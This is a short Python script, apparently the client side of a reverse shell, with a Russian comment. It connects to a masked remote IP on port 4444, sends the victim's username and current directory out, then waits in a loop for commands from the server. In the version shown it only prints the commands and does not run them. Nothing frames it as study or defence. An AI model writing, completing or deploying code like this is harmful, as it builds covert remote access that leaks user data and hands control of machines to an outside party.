import socket
import getpass
import os
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '***.***.*.**'
port = 4444
s.connect((host, port))

current_user = getpass.getuser()
current_user = str(current_user)
s.send(current_user.encode())

time.sleep(0.1) #Необходимо для корректной передачи информации на сервер

current_user = os.path.abspath(os.curdir)
current_user = str(current_user)
s.send(current_user.encode())

time.sleep(0.1)

while True:
    command = s.recv(1024)
    command = command.decode()

    print('->> ', command)

    if command == 'exit':
        break
